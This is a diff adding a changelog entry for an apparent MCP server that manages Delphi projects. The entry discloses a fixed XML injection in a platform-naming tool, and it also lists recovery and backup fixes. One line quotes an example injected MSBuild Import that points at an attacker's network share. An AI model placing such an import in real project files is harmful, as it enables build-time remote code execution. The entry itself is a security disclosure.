@@ -6,6 +6,37 @@ All notable changes to this project are documented here. The format follows
 adds tools/capabilities and PATCH fixes. The server reports its version in
 the MCP `initialize` response (`serverInfo.version`).
 
+## [0.19.0-beta] - 2026-08-19
+
+Field round 5 (Fable): one critical injection and two recovery gaps.
+
+### Security
+- **R5-B (critical): XML injection through `delphi_config add-platform`.** The
+  platform name was interpolated raw into `<Platform value="…">` in the
+  `.dproj`, with no validation or escaping. A crafted name closed the tag and
+  injected a live `<Import Project="\\attacker\share\x.targets"/>` — which
+  MSBuild would execute on the next `delphi_build` (build-time RCE). The name
+  is now validated against the canonical platform whitelist (Win32, Win64,
+  Win64x, WinARM64EC, OSX64, OSXARM64, Linux64, Android(64), iOS…); anything
+  else is refused, so no metacharacter can reach the file. It really is a
+  curated edit now.
+
+### Added
+- **`delphi_config remove-platform`**: the reversible inverse of
+  add-platform (disables a platform), backing the `.dproj` up first — the
+  symmetry that was missing for recovery.
+
+### Fixed
+- **R5-A: the trash was unrecoverable by the route its own message named.**
+  `delphi_delete` said "recover with `delphi_move` from that path", but
+  `delphi_move` refused any path under the trash. Restoring an item OUT of the
+  trash is now allowed (moving the trash folder itself, or moving items INTO
+  it by hand, stays refused), and the delete message spells out the exact
+  call.
+- **R5-C: `.dproj` edits now leave a backup.** `add-platform`/`remove-platform`
+  write through the same backup-first path as `delphi_edit`, so a bad edit is
+  recoverable from `__delphi-patch\`.
+
 ## [0.18.0-beta] - 2026-08-19
 
 Four issues from an external code review, all fixed and regression-tested.
